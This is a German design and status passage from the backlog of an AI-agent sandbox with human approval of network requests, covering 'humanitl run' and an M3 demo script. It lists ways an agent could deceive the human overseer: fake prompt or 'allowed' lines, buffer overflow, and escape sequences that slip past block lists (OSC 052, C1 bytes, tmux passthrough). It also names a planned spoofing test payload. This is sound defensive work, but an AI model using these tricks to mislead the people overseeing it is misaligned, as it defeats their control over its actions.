Audit von 28 Agenten gegen den Code: 16 Widersprüche, 7 blockierend, oben im Text korrigiert. Vorhanden: die HUM-066-Hälfte von `run.rs` (`ctx.config()`, `session_lines`, `not_yet_failure`), der Start-Pfad in `cmd/sandbox.rs` (`start`, `enforce_isolation`, `wait_or_interrupt`, `finish`, `exit_code_of` mit Tests), `Context::connect`/`config`, die `DAEMON_002`-Prüfung in `cmd/daemon.rs`, `client::channel` mit `DAEMON_001`, die vier Kurz-Flags aus dem Schema, `FlowEvent.Held`, `FlowSummary`, `FlowDetail`, `GetBody`, `DecideRequest.remember`/`allow_edited`, `TerminalInput.Open.read_only`, `sanitize_note`, `is_fullscreen_tui`, `rules_document()`/`rule_files()`, die vier Ränge aus HUM-104. Fehlend: alles, was die CLI in den Daemon tragen müsste — und der Daemon selbst. Daher XL statt L.

**Blockierend in der ersten Fassung, jetzt korrigiert:**

- `Sandbox(Start { …, ask_mode, cli_overrides })`: `Start` hat `profile`, `work_dir`, `work_mode`, `command`. Ohne die neuen Felder und ohne einen Daemon, der je Start auflöst, sind `--profile`, `--llm`, `--ask` Dekoration. Das war nirgends genannt und ist der Rumpf des Issues.
- `Start.profile` meinte das Sitzungsprofil; der Dienst sucht darunter das bwrap-Profil unter `profiles/sandbox/` und antwortet für `llm-only` mit `CONFIG_001`. Jetzt `session_profile` daneben.
- `--ask none` ⇒ `403`/`AskModeNone`: heute `504`/`TimedOut`, vom Briefing (HUM-071) mit Test zugesichert. Entscheidung (b) statt Behauptung.
- `run_llm_only_blocks_curl` erwartete `AskModeNone`: die Profilregel `block host "**"` entscheidet vorher (`Block{Rule}`), sobald sie verdrahtet ist; und verdrahtet wird sie **hier** (HUM-104, Nicht-Ziel), was die erste Fassung nicht erwähnte.
- `humanitl run --ask terminal` mit OpenCode in Kriterium 2 und drei Tests: CONVENTIONS 4.10 verweigert das mit `CLI_002`; der Sprint-Kopf sagte es seit dem 2026-09-02, der Text nicht.
- Weiter korrigiert: `Subscribe { held_only }` (Feld existiert nicht); `IsolationResult` (heißt `CheckResult`, und der Dienst sendet ihn erst mit HUM-041); `PROJECT_002` und `SESSION_001` (keine Bereiche `PROJECT`/`SESSION`); `--ro`, `--detach`, `attach`, `sessions summary` (nicht in 3.8, kein RPC, `Cmd` ohne `Attach`/`Sessions`); `daemon/crates/ipc/src/service.rs` (existiert nicht); `TerminalInput.detach` als „neues Feld `read_only`" (Feld ist da, auf `Open`); Exit 4 „nur für Tests" (ist `EXIT_SECURITY`); `systemctl --user start humanitld.socket` ohne Unit.

**Offen, hier nicht entschieden:** (a) Sitzungskonfiguration im Daemon (kein anderes Issue in Sprint 3 liefert sie; entweder hier oder als eigenes Issue davor), (b) `504` oder `403` für `--ask none`, (c) die Verweigerung von `--ask terminal` und der Aufruf der drei Tests, (d) `CLI_00n` gegen zwei neue Bereiche, (e) welche PTY-/termios-/Signal-Crates der Elternagent in `daemon/Cargo.toml` aufnimmt (`nix`, `signal-hook`, `expectrl` fehlen alle).

**Seit dem Audit überholt:** HUM-104 ist gemerged (Rang 1 für die Durchreiche, mit Test am Ladeweg); der Kommentar in `profiles/llm-only.toml` beschreibt die Ränge jetzt richtig, seine Aussage „sofort geblockt" für `ask_mode = none` bleibt falsch, solange (b) nicht entschieden ist. HUM-040 ist gemerged; `SandboxService` prüft Profilname und Projektverzeichnis am Socket (CONVENTIONS 4.17).

**Aus dem Audit nicht bestätigt:** nichts Wesentliches; Zeilenanker in `humanitl.proto` (`Start` heute ab Zeile 763) und `ipc/src/sandbox.rs` (`profile_path` um Zeile 1069) sind gewandert.

**Feindliche Eingabe:** vier Stellen, und dieses Issue ist die erste, an der Bytes des Agenten das Terminal des Nutzers erreichen. (1) Der Prompt-Kasten zeichnet Methode, URL, Host, Pfad, `origin_tool`, Fund-Text und Katalogzeile aus der Anfrage des Agenten in ein Terminal, das die CLI selbst in `cfmakeraw` gesetzt hat: `sanitize_note` und Breitenklemme je Feld, sonst fälscht ein Wert eine Kastenkante oder schiebt `[a] allow once` vom Schirm. (2) Der `v`-Pager druckt Rohbytes aus `GetBody`; kein Filter sitzt dort. Der Pager hex-rendert selbst. (3) `e` schreibt Agenten-HTTP in eine Datei und öffnet `$EDITOR`: Modelines und Ähnliches führen fremden Text aus; 0600 im Laufzeitverzeichnis, auf jedem Ausgang löschen, Rückweg validieren (`IPC_004`). (4) Agent-stdout teilt sich das Terminal mit dem Prompt; der Agent kann den 256-KiB-Puffer absichtlich zum Überlaufen bringen und einen falschen Prompt oder ein falsches `[humanitl] allowed` malen — genau der Grund für `CLI_002` bei Vollbild-TUIs. Ohne den HUM-042-Filter auf dem Durchleitungspfad öffnet HUM-067 den Terminal-Seitenkanal wieder, den HUM-042 schließt. Schon gedeckt: `POST http://humanitl.internal/ask` (`meta.rs`, `sanitize_note`), und das Projekt-Profil kann `hold.ask_mode`, `sandbox.*`, `agent.*`, `llm.*` nicht setzen (`x-project-scope = "denied"`, `CONFIG_003`/`CONFIG_009`) — solange `run.rs` `ctx.config()` vor allem anderen ruft.

### Fallstricke
- **Prompt und Agent-Ausgabe im selben Terminal.** Ohne Pufferung überschreibt der Agent den Prompt. Pufferung mit Cap; wenn der Cap erreicht ist, wird der Prompt neu gezeichnet, nachdem die Ausgabe gefiltert durchgeleitet wurde. Empfehlung in `docs/cli.md`: `--ask terminal` für Shell-Sessions, `--ask ui` oder `none` für TUI-Agenten; für OpenCode erzwingt `CLI_002` das.
- Raw-Mode ohne Restore macht das Terminal unbrauchbar. Restore in `Drop`, Panic-Hook und Signal-Handler, dreifach.
- `$EDITOR` kann ein GUI-Editor sein, der sofort zurückkehrt (`code` ohne `--wait`). Hinweis in der Prompt-Zeile: „waiting for editor to close".
- Ein zweites `humanitl run` im selben cwd ⇒ `CLI_00n` (Blocking): "A session for this folder is already running (id …)." Ohne `attach` nennt der Text keinen Anhänge-Befehl.
- `--llm` mit öffentlicher IP ⇒ `LLM_006` wird vor dem Start gedruckt, Start läuft trotzdem (Info).
- `ctx.config()` bleibt der erste Aufruf; alles, was vorher startet, umgeht den `CONFIG_003`-Riegel.

### Stand (2026-09-05): die Sitzungskonfiguration und der Lauf ohne PTY

Gebaut ist der Teil, der ohne HUM-042 vollständig sinnvoll ist, und mit ihm der
Rumpf, den die erste Fassung nicht nannte: **der Daemon bekommt eine
Konfiguration je Sitzung.** Bis hierher löste `humanitld` sie genau einmal beim
Start auf und fror Regelspeicher, Haltefrist und Durchreiche darum ein;
`--profile`, `--ask` und `--llm` hatten keinen Weg hinein. Jetzt haben sie
einen, und er trägt auch alles, was danach kommt.

**Was gilt.**

- `humanitl run [--profile NAME] [--work DIR] [--work-mode ro|rw] [--ask ui|none] [--llm URL] [-- CMD...]`
  im Projektverzeichnis. Der Befehl löst zuerst das Sitzungsprofil auf
  (`ctx.config()`, der `CONFIG_003`-Riegel gegen ein feindliches
  Projekt-Profil), verbindet den Daemon, prüft die Vertragsversion, startet
  eine Sitzung mit `work_dir = cwd`, druckt die drei Garantien als je eine
  Zeile, reicht die Ausgabe des Agenten durch und endet mit dessen Exit-Code.
- `SandboxService` nimmt einen `SessionResolver` statt einer eingefrorenen
  `Config`. Jeder `Sandbox(Start)` löst für seine Sitzung neu auf und baut
  daraus die mitgelieferte Gruppe des Regelspeichers (Durchreiche, Profilregeln
  Rang 4, `rules/default.yaml`) sowie Frage-Modus, Haltefrist und
  Sprachmodell-Endpunkt, die Proxy und Meta-Endpunkt lesen.
- `Start` trägt dafür `session_profile`, `ask_mode` und `cli_overrides`;
  `SandboxEvent` trägt `output` und `exit`. Vertrags-Minor 4.
- Ein Client darf genau zwei Konfigurationspfade setzen: `llm.endpoint` und
  `hold.timeout_secs`. Jeder andere ist `CONFIG_003`. Die Begründung steht in
  `backlog/CONVENTIONS.md` 4.26; kurz: Über einem offenen Namensraum kann keine
  Sperrliste vollständig sein, und `sandbox.profile`, `agent.command` und
  `sandbox.env` bestimmten sonst die Einhängefläche der Sandbox und den Prozess
  darin — vom Socket aus.
- `--ask none` bleibt `504`/`TimedOut`. Entscheidung (b) der Spezifikation, mit
  Begründung in 4.25; der irreführende Kommentar in `profiles/llm-only.toml`
  ist korrigiert. `BlockReason::AskModeNone` gibt es nicht.
- Ein zweiter Start, während eine Sitzung läuft, ist `CLI_005` (Entscheidung
  (d): ein Code im Bereich `CLI`, kein neuer Bereich).
- `docs/cli.md` beschreibt Flags, Frage-Modi, Signale und Exit-Codes so, wie
  sie sind, samt der bekannten Kollision zwischen dem Exit-Code des Agenten und
  den Codes 2 und 3.

**Was nicht gilt, und unter welchem Issue es kommt.**

- **Kein PTY (HUM-042).** Der Agent bekommt kein Terminal. Seine Ausgabe reist
  als Bytes über den Ereignisstrom und geht auf `stdout` und `stderr` der
  Kommandozeile; es gibt keine Eingabe an ihn, keinen Raw-Modus, keine
  Weiterleitung von `SIGWINCH` und kein `Ctrl+]`-Menü. `Ctrl+C` beendet die
  Sitzung über `Sandbox(Stop)`, statt als Byte an den Agenten zu gehen.
- **Kein `--ask terminal` (HUM-042).** Der Befehl antwortet mit `CLI_002` und
  schlägt `--ask ui` oder `--ask none` vor — genau das Verhalten, das für
  Vollbild-TUI-Agenten ohnehin dauerhaft gilt (CONVENTIONS 4.10), vorläufig für
  alle. Damit entfällt auch der Prompt-Kasten, die Zwei-Schritt-Regelauswahl,
  der `e`-Editor-Weg und der `v`-Pager; die drei `ask_terminal_*`-Tests und
  `pager_renders_control_bytes_inert` kommen mit dem Prompt. Entscheidung (c)
  ist damit für diese Fassung beantwortet und für HUM-042 offen.
- **Keine Zeile je gehaltener Anfrage.** `--ask ui` sagt vor dem Start in
  einer Zeile, wo entschieden wird, und danach nichts mehr; `[humanitl]
  request held: …` braucht den `Subscribe`-Strom und die Säuberung der Werte,
  die aus der Anfrage des Agenten stammen (Schritt 7 der Spezifikation). Beides
  gehört zum Terminal.
- **Kein Attach durch die Oberfläche (HUM-042).** `Terminal` antwortet weiter
  mit `UNIMPLEMENTED`; `attach_read_only_sees_output` und
  `reader_cannot_write` gehören dorthin. Die Oberfläche sieht die laufende
  Sitzung im Sandbox-Bildschirm und kann Hold-Entscheidungen treffen — das
  geht seit HUM-040 und hängt nicht am Terminal.
- **Kein `SIGTERM`-Pfad mit Exit 143 und kein Panik-Hook** (`tty.rs` gibt es
  nicht): Ohne Raw-Modus gibt es nichts wiederherzustellen. Die Tests
  `raw_mode_restored_on_panic` und `sigterm_stops_session_exit_143` gehören zu
  HUM-042.
- **Keine Summary-Zeile** (HUM-043), kein `--detach`, kein `attach` (aus dem
  Issue herausgenommen).

**Der Filter ist hier gebaut, nicht dort.** Sobald Bytes des Agenten das
Terminal eines Menschen erreichen, ist der Terminal-Seitenkanal offen
(BACKLOG.md 4.2). `humanitl_core::TerminalFilter` steht deshalb im Daemon, mit
Zustand über Stückgrenzen hinweg. HUM-042 erweitert ihn für den PTY-Pfad,
statt einen zweiten daneben zu bauen.

**Er ist eine Erlaubnisliste, und das ist die Antwort auf den Fallstrick des
Issues.** Die erste Fassung sperrte OSC 52 und OSC 8. Der Review fand vier
Wege daran vorbei, und alle vier waren wirksam: `OSC 052` (Terminals lesen die
Nummer als Zahl), `OSC 0` (setzt den Fenstertitel), `\x9d52;…` (dieselbe Folge
in einem C1-Byte) und `ESC P tmux;…` (reicht die verbotene Folge durch tmux
hindurch). Statt vier Löcher zu stopfen, dreht der Filter die Richtung um:
**Von allen Steuerfolgen geht genau eine hinaus, `ESC [ … m`.** Dieselbe
Begründung wie bei `VISIBLE_ENV` und `SESSION_OVERRIDE_KEYS` — über einem
offenen Namensraum kann keine Sperrliste vollständig sein.

**Cursorbewegung und Löschen gehen damit nicht hinaus.** Das war die
Entscheidung, die der Review verlangte: `\x1b[1A\x1b[2K` überschreibt eine
Zeile, die schon steht, und die drei Zeilen der Isolationsprüfung stehen genau
dort. Sie ausdrücklich stehen zu lassen und in `docs/SECURITY.md` als Lücke zu
benennen, wäre die andere zulässige Antwort gewesen; sie ist es nicht geworden,
weil ohne PTY nichts davon gebraucht wird. Der Agent schreibt in eine Pipe, und
was in eine Pipe schreibt, färbt höchstens. Der Preis steht in `docs/cli.md`:
Ein Fortschrittsbalken, der mit `\x1b[K` löscht, lässt Reste stehen.

**Bytes sind roh, deshalb entscheidet der Filter am Codepunkt.** Gemessen und
nicht angenommen: `SandboxEvent.OutputChunk.data` ist `bytes`, `Shared::tee`
kopiert aus der Pipe, `write_output` schreibt mit `write_all` — auf dem ganzen
Weg steht keine UTF-8-Prüfung. Die C1-Steuerzeichen sind damit voll wirksam,
und zwar in beiden Schreibweisen: als einzelnes Byte (`\x9b`) und als
wohlgeformte UTF-8-Kodierung (`C2 9B`). Die zweite fand erst der zweite
Review; VTE-basierte Terminals — GNOME Terminal, Tilix, Terminator, XFCE
Terminal, Guake — dekodieren UTF-8 vor dem Parser und führen `U+009B` als CSI
aus, xterm ebenso mit seiner Vorgabe. Entschieden wird deshalb am Codepunkt:
`0xC2` ist das einzige Anfangsbyte, aus dem ein C1-Steuerzeichen werden kann,
und wird zurückgehalten, bis das Folgebyte es entscheidet. Ein Terminal, das
nicht in UTF-8 arbeitet, bleibt die benannte Restlücke; sie steht in
`docs/SECURITY.md` 3.3.

**Eine Profilregel kann sich den Rang der Durchreiche nicht selbst
ausstellen.** Der zweite Fund desselben Reviews, und der ernstere: Weil dieses
Issue Profilregeln in die mitgelieferte Gruppe aufnimmt und `set_bundled` auf
jede Regel dieser Gruppe `bundled` stempelt, hätte ein globales Profil mit
`[rules].inline` und `passthrough_llm = true` sich Rang 1 gegeben — einen
ungehaltenen Weg für einen beliebigen Host, der die Block-Regeln des Nutzers
überholt, ohne einen einzigen Befund. `parse_rules` verwirft `bundled` aus
einer Datei, `passthrough_llm` aber nicht. `BundledRules` trennt die
Durchreiche deshalb im Typ, nimmt jeder anderen Regel den Vermerk und meldet
den Entzug. Nicht geändert wurde `humanitl_rules::parse_rules`: Dass eine
`rules.yaml` des Nutzers den Vermerk behält, ist eine dokumentierte
Entscheidung von HUM-039/HUM-104 mit eigenem Test, und dort ist er ohne
`bundled` kein Rang, sondern nur eine Beschriftung. Dass diese Beschriftung
falsch sein kann, gehört in ein eigenes Issue.

**`llm.endpoint` vergrößert etwas, und das steht jetzt so da.** Die erste
Fassung begründete seinen Platz auf der Erlaubnisliste damit, es vergrößere
nichts, und verwies auf eine `LLM_006`-Meldung, die auf diesem Weg niemand
erzeugte. Beides ist korrigiert: Die Begründung nennt jetzt, was der Schlüssel
wirklich aufmacht (Rang 1, `allow_private`, für die Inferenzpfade eines
beliebigen Hosts), warum er trotzdem darauf steht (3.8 führt ihn als Flag von
`run`, und seine Wirkung ist an drei Stellen sichtbar), und `apply_session`
meldet `LLM_006` beim Start — entschieden am Namen, ohne aufzulösen.

**Ein Start beansprucht die Sitzung, bevor er etwas merkt.** `self.running`
wird erst gesetzt, wenn `bwrap` steht; zwei gleichzeitige `Start` kämen an
`is_running()` beide vorbei, beide startten, und der zweite verdrängte den
ersten aus `running` — der erste Prozess liefe weiter, ohne dass ihn noch
jemand beenden könnte. `Pending::claimed` wird unter demselben Schloss geprüft
und gesetzt, und `remember` gibt das geprüfte Projektverzeichnis unter
demselben Schloss zurück, statt es später ein zweites Mal aus `pending` zu
lesen.

**Tests.** `crates/ipc/tests/session_config.rs` misst die Sitzungskonfiguration
am Regelspeicher und am Sitzungszustand, die der Daemon wirklich verdrahtet, je
mit Gegenprobe ohne den Wunsch: Profilregel, Frage-Modus, Durchreiche aus
`--llm`, Vorrang der Kommandozeile über das Profil, und die drei Ablehnungen
(`CONFIG_001` für ein unbekanntes Profil, `CONFIG_003` für einen Pfad außerhalb
der Erlaubnisliste und für einen Frage-Modus, den es nicht gibt).
`crates/ipc/tests/sandbox_start.rs` fährt eine echte Sandbox und prüft, dass
`hello` und `bye` ankommen, kein `ESC` den Daemon verlässt und der Exit-Code 7
als eigenes Ereignis dahintersteht. `crates/core-types/src/terminal.rs` hält den
Filter fest, mit je einem Test für die vier Wege, die der Review an der ersten
Fassung vorbeifand, für Cursorbewegung und Löschen, für die abgeschnittene
Folge am Stromende, für den einzelnen Backslash in einer verworfenen Nutzlast,
für eine Folge über zwei Stücke und für Text außerhalb von ASCII, dessen Bytes
im C1-Bereich liegen. `only_one_of_two_concurrent_starts_gets_the_session`
schickt zwei `Start` nebeneinander und belegt, dass genau einer `CLI_005`
bekommt und genau eine Sandbox `running` meldet.
`a_profile_rule_cannot_grant_itself_the_rank_of_the_passthrough` fährt eine
Profilregel mit `passthrough_llm: true` durch `bundled_rules`, durch beide
Wege in den Regelspeicher (`load` und `set_bundled`) und durch
`RuleSet::evaluate` gegen eine Block-Regel des Nutzers; erwartet wird `Block`.
`a_language_model_outside_the_private_network_is_reported` belegt `LLM_006` am
Start. Jeder dieser Tests hat seine Mutationsprobe; sie stehen im Bericht zum
Commit.
`bin/humanitl/tests/cli.rs` prüft die drei Wege, auf denen `run` nicht startet:
ohne Daemon `DAEMON_001` mit Exit 2, mit `--ask terminal` `CLI_002` ohne dass
überhaupt verbunden wird, und mit einem Profil, das es nicht gibt, `CONFIG_001`.

**Was an der Spezifikation nicht stimmt.** Die Tests `run_sh_echo_exit_code`,
`run_llm_only_blocks_curl` und `run_llm_only_allows_llm` verlangen einen
laufenden Daemon mit Proxy, Aufzeichnung und einem Fake-Sprachmodell; das ist
der Aufbau von `tests/e2e` und nicht der eines Unit-Tests im Workspace. Sie
gehören in das M3-Demoskript (HUM-046), das genau diesen Aufbau baut, und
stehen hier deshalb als Tests am Ladeweg statt als Tests am Netz.
`run_default_ask_none_status` ist mit Entscheidung (b) der Test, den
`briefing.rs` schon hat.

### Referenzen
BACKLOG.md ADR-013, Abschnitt 1.3 Prinzip 9; CONVENTIONS.md 3.2, 3.8, 4.5, 4.10, 4.17, 4.23; HUM-041, HUM-042 (Terminal), HUM-066 (Profile), HUM-104 (Reihenfolge). pipelock `action: ask` (https://github.com/luckyPipewrench/pipelock), `termios(3)`.

---

## HUM-046 · Demo-Skript M3
Sprint: 3 · Größe: L · Abhängigkeiten: HUM-037, HUM-038, HUM-039, HUM-066, HUM-071, HUM-072, HUM-073, HUM-104 (gebaut); hart für die volle Fassung: HUM-041 (Check-Ereignisse), HUM-042 (Terminal und Hinweiszeile), HUM-043 (Summary), HUM-067 (`humanitl run`); nur für die `https`-Variante von STEP3: HUM-087 · Blockiert: Sprint 4

### Kontext
Jeder Sprint endet mit einem grünen Demo-Skript in CI (BACKLOG.md Abschnitt 8). M3 beweist: Agent in der Sandbox, LLM-Passthrough, Default-Regeln greifen, ein Hold wird per gRPC entschieden, das Ergebnis erscheint beim Agenten. Da echtes OpenCode und ein echtes LLM in CI nicht verfügbar sind, laufen zwei Varianten: `agent-e2e` mit Mock-LLM und Skript-Agent (immer), und `agent-real` mit OpenCode gegen den Mock-LLM (nur wenn `opencode` im Runner-Image ist, sonst als `skip` gemeldet, nie als `pass`).

### Ziel
`tests/e2e/m3_agent_inside/run.sh` startet über `tests/e2e/lib.sh` den Daemon, den Ollama-Mock und eine Sandbox mit Profil `default` und einem Skript-Agenten (`sh`), und prüft die Demo-Schritte automatisch, mit fester Zahl an Zusicherungen wie M2. CI-Job `e2e-agent` führt den Lauf aus. Was HUM-041, HUM-042, HUM-043 und HUM-067 voraussetzt, steht im Lauf als Stolperdraht, der rot wird, sobald das Fehlende da ist, und bis dahin ausdrücklich als offen gemeldet wird.

### Nicht-Ziel
Keine UI-Automation von M3 (der Job `e2e-xvfb` existiert und fährt heute M2; die Bildschirm-Hälfte von M3 kommt später dorthin). Keine Performance-Messung. Keine Rust-Testcrate, keine Cargo-Features, kein `axum`, kein `expectrl` (siehe Stand). Kein Test-Hebel `experimental.upstream_override` (existiert nicht, und `experimental.upstream_port_map` ist mit HUM-088 entfernt statt gebaut).

### Betroffene Pfade
- `tests/e2e/m3_agent_inside/run.sh` (neu), `config.toml` (neu, nach dem Muster `m2_first_decision/config.toml` mit `@UPSTREAM_ADDR@` und `resolver.overrides`), `agent_script.sh` (neu)
- `tests/e2e/mock_llm/mock_llm.py` (neu): `ThreadingHTTPServer` nach dem Vorbild `tests/e2e/fake-upstream/fake_upstream.py`
- `tests/e2e/run.sh`: Zweig `E2E_ONLY=m3`
- `.github/workflows/ci.yml`: Job `e2e-agent`, kopiert von `e2e-xvfb` ohne Flutter (AppArmor-userns-Schritt, `bubblewrap curl jq python3 iproute2 util-linux musl-tools`, 30 min, `target/e2e` als Artefakt)
- `backlog/CONVENTIONS.md`: Abschnitt **4.29** in der Form von 4.22 (4.25 bis 4.28 sind seither an HUM-101, HUM-067, HUM-103 und HUM-042 vergeben). Nicht mehr „was offen bleibt": die fünf Issues sind gebaut, der Abschnitt hält die Abweichungen und die zwei verbliebenen Stolperdrähte fest
- `tests/e2e/README.md`

Gestrichen: `tests/e2e/m3_agent_inside.rs`, `tests/e2e/mock_llm/` als axum-Bin, `tests/e2e/fixtures/agent_script.sh` per `SandboxFile`, `daemon/Cargo.toml`, `tools/deps-allow.toml`.

### Spezifikation

Ollama-Mock (`mock_llm.py`, bindet die Adresse, die der Lauf übergibt, schreibt `READY http=<port>` auf stdout, eine Zugriffszeile je Anfrage in festem Format auf stderr):

- `GET /api/tags` ⇒ `{"models":[{"name":"mock:latest","modified_at":"2026-09-01T00:00:00Z","size":1}]}`
- `GET /v1/models` ⇒ `{"object":"list","data":[{"id":"mock","object":"model"}]}`
- `POST /v1/chat/completions` mit `stream: true` ⇒ SSE mit 10 Chunks à `{"choices":[{"delta":{"content":"tok{i} "}}]}` im Abstand 30 ms, je Chunk ein ausdrücklicher `flush`, dann `data: [DONE]`; ohne `stream` ⇒ eine JSON-Antwort mit `content: "mock reply"`. Der Mock speichert den letzten Request-Body unter `GET /_debug/last` (nur für den Testprozess auf dem Host; aus der Sandbox träfe der Pfad keines der Durchreich-Präfixe aus `opencode.rs` und würde gehalten).
- `POST /api/chat` analog im Ollama-Format (`{"message":{"content":"tok"},"done":false}` NDJSON).
- Eigener Test ohne Daemon: `python3 mock_llm.py` plus ein `curl`, das zehn `data:`-Rahmen zählt, damit ein roter M3-Lauf von einem kaputten Mock unterscheidbar ist.

Netz: beide Ziele liegen im eigenen Namensraum des Laufs auf `198.51.100.7` (`E2E_FAKE_ADDR`, `e2e_enter_namespace` in `lib.sh`): der LLM-Mock auf einem hohen Port, das zweite Ziel (`fake_upstream.py`) auf Port 80, `example.com` per `resolver.overrides` dorthin. **Nie `127.0.0.1` für das zweite Ziel:** `daemon/crates/proxy/src/upstream.rs` macht aus jeder aufgelösten privaten Adresse `UpstreamError::PrivateAddress`, sofern die entscheidende Regel nicht `allow_private` trägt, und ein `Decide{Allow}` eines Menschen setzt das nie — der Fluss endete immer als `502 upstream_private_address` (CONVENTIONS 4.22). Nur die Durchreiche darf auf Loopback liegen, weil `llm_passthrough` in `opencode.rs` `.with_allow_private(true)` setzt.

Daemon: `start_daemon STATE_DIR XDG_DIR [HOLD]` aus `lib.sh` (baut den Wegwerf-XDG-Baum, kopiert die Sandbox-Profile, wartet auf beide Sockets). `humanitld` hat kein `--config`; seine Schalter sind `--fake`, `--speed`, `--loop`, `--scale-timeouts`, `--hold-timeout-secs`, `--event-buffer`, `--socket`. Der Endpoint kommt über die Umgebung, neben `HUMANITL_HOLD__TIMEOUT_SECS`: `HUMANITL_LLM__ENDPOINT=http://198.51.100.7:<port>`, damit `llm_passthrough_rule` in `main.rs` die Durchreiche beim Start baut (Rang 1, CONVENTIONS 4.5).

Agent-Skript (`agent_script.sh`; wird nach `$E2E_WORKDIR/work` kopiert und als `sandbox_run /bin/sh /work/agent_script.sh &` gestartet, wie M2 seinen Agenten startet — `SandboxFile` entsteht nur aus `AgentAdapter::files` und muss außerhalb von `/work` liegen, `/tests` ist im Profil `default` kein Mount):

```sh
#!/bin/sh
set -u
echo "STEP1 llm"
curl -sS -X POST "$LLM/v1/chat/completions" -H 'content-type: application/json' \
  -d '{"model":"mock","stream":true,"messages":[{"role":"user","content":"hello"}]}' | head -c 200
echo; echo "STEP2 modelsdev"
curl -sS -o /dev/null -w '%{http_code}\n' https://models.dev/api.json
echo "STEP3 webfetch"
curl -sS -o /dev/null -w '%{http_code}\n' http://example.com/docs
echo "STEP4 done"
```

`$LLM` wird über `sandbox.env` in der `config.toml` des Laufs gesetzt. STEP3 läuft über `http://`, bis HUM-087 `--allow-test-ca` liefert: `ClientTls::new(&[], …)` in `main.rs` hat eine leere Wurzelliste, jede TLS-Anfrage an ein lokales Ziel endet heute `502 upstream_tls` (CONVENTIONS 4.22). Der Kopf des Laufs sagt, dass der MITM-Pfad bis dahin ungeprüft bleibt.

Testablauf `m3_agent_inside` (Shell, `e2e_check`/`e2e_expect` zählen):

1. Namensraum betreten, Mock und `fake_upstream.py` starten, `READY` lesen, `start_daemon` mit Endpoint.
2. `sandbox_run` im Hintergrund mit `-v`; Erwartung A: die drei Zeilen `check <name> pass|FAIL: <evidence>` auf stderr, alle `pass` (der CLI-Lauf endet fail-closed mit Exit 3, wenn eine rot ist). Stolperdraht: sobald `daemon/crates/ipc/src/sandbox.rs` `SandboxEvent.check` sendet (HUM-041), wird der Lauf rot und die Prüfung wandert auf den RPC.
3. Erwartung B (STEP1), aus drei Quellen: `humanitl --json flows list 'host:198.51.100.7'` mit `include_passthrough` zeigt einen Fluss mit `decision_source == passthrough` (`FlowEvent.Decided` hat kein Feld `passthrough`; das Merkmal ist `DecisionSource::Passthrough`, CONVENTIONS 4.21); die aufgefangene Agentenausgabe enthält `tok0`; `/_debug/last` des Mocks enthält `"hello"`.
4. Erwartung C (STEP2): Fluss zu `models.dev` mit `Decided(Block { reason: Rule(01920000-0000-7000-8000-000000000001) })` (`rules/default.yaml`), kein `Held`; der Agent sah `403`.
5. Erwartung D (STEP3): `wait_for_held 10 'host:example.com'`, `flow_decide <id> allow`; der Agent sah `200`, die Zeile endet `Recorded`. Stolperdraht auf der fehlenden Hinweiszeile `[humanitl] request held`: rot, sobald `server.rs` für `Terminal` nicht mehr `unimplemented` liefert (HUM-042); bis dahin sagt der Kopf, dass die Hinweis-Hälfte unbewiesen ist.
6. Erwartung E (STEP4): Exit 0 von `sandbox_run` und ein `find` über das Projektverzeichnis, das es unverändert zeigt. `SessionSummary`, `SessionEnded` und `humanitl sessions summary` gibt es nicht (HUM-043); Stolperdraht auf `Cmd::Sessions`.
7. Historie: genau drei Flüsse in der Reihenfolge Passthrough, Block, Allow. `ListFlows` versteckt Durchreich-Flüsse ohne `include_passthrough` und sortiert neueste zuerst; `humanitl flows list` hat `--asc`, aber keinen Schalter für `include_passthrough`. Der Lauf hält diese Paritätslücke im Kopf fest (wie CONVENTIONS 4.22 die von `flows decide`), statt am CLI vorbei einen gRPC-Client zu bauen (CONVENTIONS 3.11).
8. Audit-Kette nur, wenn HUM-050 da ist (`Audit` ist `unimplemented`).
9. Zusatz zur Hinweiszeile, sobald HUM-042 steht: eine vierte Anfrage an einen Host mit Pfad, der `\r\n[humanitl] allowed` und eine OSC-52-Nutzlast trägt; Erwartung: genau ein `[humanitl] allowed` im Transkript, kein `ESC ]`. Bis dahin: Transkript als Bytes auffangen und zusichern, dass kein `ESC ]` durchkommt — die Lücke wird gemessen, nicht angenommen.
10. Block mit Notiz (HUM-072, Sprint-Kopf): eine Notiz mit `\r`, `\n` und einem Steuerbyte; der Kopf `X-Humanitl-Note`, den der Agent sieht, ist einzeilig.

Zweiter Test `m3_cli_llm_only` (`humanitl run --profile llm-only --llm … --work <tmp> -- sh /work/agent_script.sh`): erst mit HUM-067. `run.rs` endet heute mit `not_yet_failure("humanitl run", "HUM-067")`, und die `403` für STEP2/STEP3 setzt HUM-067s Verdrahtung von `Profile::rules_document()` voraus (`block host "**"` aus `profiles/llm-only.toml` hat außerhalb von Tests keinen Leser); `ask_mode = none` allein liefert heute `504`/`TimedOut`, nicht `403` (`main.rs`: `AskMode::None => Duration::ZERO`). HUM-067 bringt seine eigenen `run_llm_only_*`-Tests mit; hier nur der Stolperdraht auf `humanitl run --help`.

Dritter Test `m3_real_opencode` (nur wenn `command -v opencode`): Profil `default`, Adapter OpenCode, `--ask none`; Erwartung: Passthrough-Fluss zu `/v1/models`, kein Fluss zu `models.dev` (heute `models.opencode.ai`, CONVENTIONS 4.17) in einem anderen Zustand als Block, höchstens ein `Held`. Kein „Prompt-Marker aus `agents/opencode/README.md`": die Datei enthält weder Banner noch Marker noch TUI-String; wer einen will, misst ihn an einem echten Lauf und schreibt ihn hier hinein.

CI-Job `e2e-agent`: `E2E_ONLY=m3`, Artefakte Daemon-Log, Agenten-Transkript, `humanitl flows list --json`. Kein `shellcheck` (steht in keinem Job, nicht im `Makefile`, nicht in AGENTS.md); POSIX bleibt Sache des Reviews wie bei jedem vorhandenen e2e-Skript.

### Schritte
1. Pfadliste auf die Shell-Harness umstellen (oben geschehen).
2. `mock_llm.py` samt eigenem Test.
3. Beide Ziele im Namensraum, `config.toml` mit `resolver.overrides` und `sandbox.env`.
4. `agent_script.sh` nach `/work`, `run.sh` mit fester Zusicherungszahl (`M3_EXPECTED_ASSERTIONS`) und `collect`-Trap wie M2.
5. Stolperdrähte für HUM-041, HUM-042, HUM-043, HUM-067, HUM-087.
6. `E2E_ONLY=m3`, CI-Job, README, CONVENTIONS 4.25.
7. Erst danach, als eigene Nachträge: Hinweiszeile, Summary, `run --profile llm-only`, `https`-Bein.

### Tests
Die Läufe sind das Deliverable. Zusätzlich: `mock_llm_streams_sse` (Mock isoliert, ohne Daemon).

### Akzeptanzkriterien
